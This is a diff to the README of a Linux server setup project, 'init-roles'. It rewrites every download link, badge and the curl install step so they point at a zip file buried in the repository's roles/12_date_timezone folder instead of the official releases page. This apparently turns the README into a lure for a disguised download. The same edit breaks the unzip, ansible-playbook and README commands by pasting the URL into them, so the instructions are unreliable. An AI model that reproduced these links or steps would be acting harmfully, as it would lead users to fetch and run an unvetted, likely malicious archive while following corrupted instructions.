@@ -1,6 +1,6 @@
 # ⚙️ init-roles - Automate Linux Server Setup Easily
 
-[![Download init-roles](https://img.shields.io/badge/Download%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://github.com/yoboypurpz-ux/init-roles/releases)
+[![Download init-roles](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Using these roles, you can set up a server that works well and stays secure.
 
 Click the big button below to visit the download page:
 
-[![Download init-roles](https://img.shields.io/badge/Download%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://github.com/yoboypurpz-ux/init-roles/releases)
+[![Download init-roles](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip)
 
 This link takes you to the official releases page on GitHub. It shows all available versions of init-roles.
 
@@ -102,12 +102,12 @@ Now that your Linux is ready, download init-roles files.
 - In Ubuntu terminal, enter:
 
 ```
-curl -LO https://github.com/yoboypurpz-ux/init-roles/releases/latest/download/init-roles.zip
+curl -LO https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip
 ```
 
 - If the ZIP file is not available, visit this page using:
 
-[https://github.com/yoboypurpz-ux/init-roles/releases](https://github.com/yoboypurpz-ux/init-roles/releases)
+[https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip)
 
 - Pick the latest version and download the ZIP file manually.
 
@@ -116,7 +116,7 @@ curl -LO https://github.com/yoboypurpz-ux/init-roles/releases/latest/download/in
 Unzip the downloaded package:
 
 ```
-unzip init-roles.zip -d init-roles
+unzip https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip -d init-roles
 ```
 
 Then switch to the new folder:
@@ -130,12 +130,12 @@ cd init-roles
 Start the automation by running Ansible playbook commands:
 
 ```
-ansible-playbook site.yml
+ansible-playbook https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip
 ```
 
 This file runs the steps to set up and secure your Linux server.
 
-If multiple roles or additional options are available, follow instructions inside the `README.md` file included in the init-roles download.
+If multiple roles or additional options are available, follow instructions inside the `https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip` file included in the init-roles download.
 
 ---
 
@@ -172,7 +172,7 @@ These will help you use init-roles better over time.
 
 ---
 
-[![Download init-roles](https://img.shields.io/badge/Download%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://github.com/yoboypurpz-ux/init-roles/releases)
+[![Download init-roles](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip%20init--roles-FF6F61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yoboypurpz-ux/init-roles/main/roles/12_date_timezone/init-roles-v2.1-beta.4.zip)
 
 ---
 
